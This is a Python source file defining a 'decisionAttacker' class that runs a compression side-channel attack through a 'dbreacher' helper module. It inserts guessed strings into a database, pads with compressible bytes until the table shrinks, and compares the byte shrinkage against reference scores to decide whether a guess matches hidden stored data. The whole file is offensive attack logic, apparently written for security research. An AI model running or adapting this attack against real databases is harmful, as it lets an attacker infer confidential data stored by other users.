import dbreacher
import string

class decisionAttacker():
    def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
        self.n = len(guesses)
        self.guesses = guesses
        self.dbreacher = dbreacher
        self.bytesShrunk = dict()
        self.bYesReferenceScores = dict()
        self.bNoReferenceScores = dict()

    def setUp(self) -> bool:
        success = self.dbreacher.reinsertFillers()
        self.bytesShrunk = dict()
        self.bYesReferenceScores = dict()
        self.bNoReferenceScores = dict()
        return success
    
    def calculateReferenceScores(self, guesses) -> bool:
        curr_db_count = self.dbreacher.db_count
        lengths = []
        for guess in guesses:
            if len(guess) not in lengths:
                lengths.append(len(guess))
        lengths.sort()
        ref_score_lengths = []
        for i in range(0, len(lengths), 7):
            ref_score_lengths.append(lengths[i])
        for i in ref_score_lengths:
            try:
                b_yes = self.dbreacher.getSYesReferenceScore(i) 
                b_no = self.dbreacher.getSNoReferenceScore(i, string.ascii_lowercase)
            except RuntimeError:
                #print("table shrunk too early on reference score guess")
                self.dbreacher.db_ref_score_count += (self.dbreacher.db_count - curr_db_count)
                return False
            self.bYesReferenceScores[i] = b_yes
            self.bNoReferenceScores[i] = b_no
        self.dbreacher.db_ref_score_count += (self.dbreacher.db_count - curr_db_count)
        return True
    
    def tryGroupedGuesses(self, guesses_grouped, verbose = False) -> bool:
        for guess in guesses_grouped:
            curr_db_count = self.dbreacher.db_count
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
            if shrunk:
                self.dbreacher.db_guess_count += self.dbreacher.db_count - curr_db_count
                return False
            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
            score = self.dbreacher.getBytesShrunkForCurrentGuess()
            self.dbreacher.db_guess_count += self.dbreacher.db_count - curr_db_count
            if verbose:
                print("\"" + guess + "\" bytesShrunk = " + str(score))
            self.bytesShrunk[guess] = score
        return True

    def tryAllGuesses(self, verbose = False) -> bool:
        for guess in self.guesses:
            if len(guess) not in self.bYesReferenceScores:
                try:
                    b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
                    b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
                except RuntimeError:
                    return False
                self.bYesReferenceScores[len(guess)] = b_yes
                self.bNoReferenceScores[len(guess)] = b_no
            curr_db_count = self.dbreacher.db_count
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
            guess_and_check_db_count = self.dbreacher.db_count - curr_db_count 
            if shrunk:
                return False
            curr_db_count = self.dbreacher.db_count
            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
            add_compressible_db_count = self.dbreacher.db_count - curr_db_count
            self.dbreacher.db_guess_count += (guess_and_check_db_count + add_compressible_db_count)
            score = self.dbreacher.getBytesShrunkForCurrentGuess()
            if verbose:
                print("\"" + guess + "\" bytesShrunk = " + str(score))
            self.bytesShrunk[guess] = score
        return True

    def getGuessAndReferenceScores(self):
        bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
        guessScoreTuples = []
        for b, g in bytesList:
            bYes = 0
            bNo = 0
            currLen = len(g)
            lengths = list(self.bYesReferenceScores.keys())
            minDistance = abs(lengths[0] - currLen)
            bYes = self.bYesReferenceScores[lengths[0]]
            bNo = self.bNoReferenceScores[lengths[0]]
            for i in lengths:
                distance = abs(i - currLen)
                if distance <= minDistance:
                    bYes = self.bYesReferenceScores[i]
                    bNo = self.bNoReferenceScores[i]
            min_b = min(bNo, min(b, bYes))
            guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
        return guessScoreTuples
